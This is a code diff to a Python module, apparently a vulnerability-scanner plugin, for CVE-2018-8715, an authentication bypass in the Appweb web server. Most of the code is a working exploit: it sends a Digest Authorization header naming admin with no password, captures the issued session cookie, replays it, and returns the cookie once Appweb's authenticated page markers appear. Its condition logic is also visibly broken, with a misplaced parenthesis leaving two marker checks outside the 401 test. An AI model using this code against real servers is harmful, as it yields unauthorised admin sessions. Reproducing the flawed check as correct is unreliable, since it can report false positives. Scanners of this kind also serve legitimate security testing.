@@ -1,94 +1,75 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
-from lib.tool import check
-from thirdparty import requests
-from time import sleep
-import re
+# from lib.tool import check
+# import re
 
-def cve_2018_8715_scan(self, url):
+cve_2018_8715_payloads = [                 # * 是不是很神奇, payload居然是空的
+    {'path': ''},
+    {'path': '/'},
+]
+
+def cve_2018_8715_scan(self, clients):
     ''' 其7.0.3之前的版本中, 有digest和form两种认证方式, 
             如果用户传入的密码为null(也就是没有传递密码参数)
             appweb将因为一个逻辑错误导致直接认证成功, 并返回session
     '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'unAuthorized'
-    vul_info['vul_id'] = 'CVE-2018-8715'
-    vul_info['vul_method'] = 'GET'
-    vul_info['headers'] = {
+    client = clients.get('reqClient')
+    
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'unAuthorized',
+        'vul_id': 'CVE-2018-8715',
+    }
+
+    headers = {
         'Authorization': 'Digest username=admin'
     }
 
-    headers = self.headers.copy()
-    headers.update(vul_info['headers'])
-
-    for payload in self.cve_2018_8715_payloads:
+    for payload in cve_2018_8715_payloads:
         path = payload['path']
-        data = payload['data']
-        target = url + path
 
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['target'] = target
+        res1 = client.request(
+            'get',
+            path,
+            headers=headers,
+            vul_info=vul_info
+        )
+        if res1 is None:
+            continue
 
-        try:
-            res1 = requests.get(
-                target, 
-                timeout=self.timeout, 
+        # if ((res1.status_code == 200) and ('Set-Cookie' in res1.headers)):
+        if (('Set-Cookie' in res1.headers)):
+            try:
+                cookie = {
+                    'Cookie': res1.headers['Set-Cookie']
+                }
+                headers.update(cookie)
+            except KeyError:
+                continue
+        
+            res2 = client.request(
+                'get',
+                path,
                 headers=headers,
-                data=data, 
-                proxies=self.proxies, 
-                verify=False
+                vul_info=vul_info
             )
-            logger.logging(vul_info, res1.status_code, res1)                        # * LOG
+            if res2 is None:
+                continue
 
-            if ((res1.status_code == 200) and ('Set-Cookie' in res1.headers)):
-                try:
-                    cookie = {
-                        'Cookie': res1.headers['Set-Cookie']
-                    }
-                    headers.update(cookie)
-                except KeyError:
-                    continue
-            
-                res2 = requests.get(
-                    target, 
-                    timeout=self.timeout, 
-                    headers=headers,
-                    data=data, 
-                    proxies=self.proxies, 
-                    verify=False
-                )
-                logger.logging(vul_info, res2.status_code, res2)                        # * LOG
-            else:
-                return None
-
-
-            # todo 判断
             if (('401' not in res2.text) 
-                and (('The Fast, Little Web Server' in res2.text) 
-                     or ('Quick Start' in res2.text) 
-                     or ('Appweb Resources and Useful Links' in res2.text) 
-                     or ('Thanks, Embedthis Team.' in res2.text))):
+                and (('<h1>Appweb &mdash; The Fast, Little Web Server</h1>' in res2.text) 
+                    or ('<a href="https://embedthis.com/appweb/doc/">documentation</a>' in res2.text) 
+                    or ('<h2>Appweb Resources and Useful Links</h2>' in res2.text) 
+                    or ('<a href="https://embedthis.com/appweb/download.html">https://embedthis.com/appweb/download.html</a>' in res2.text))
+                    or ('<a href="http://github.com/embedthis/appweb/issues">GitHub Appweb issue database</a>' in res2.text) 
+                    or ('All rights reserved. Embedthis and Appweb are trademarks of Embedthis Software LLC.' in res2.text) 
+            ):
                 results = {
-                    'Target': target,
+                    'Target': res2.request.url,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Cookie': cookie['Cookie']
-                    }
+                    'Cookie': cookie['Cookie'],
+                    'Request': res2
                 }
                 return results
-
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+    return None
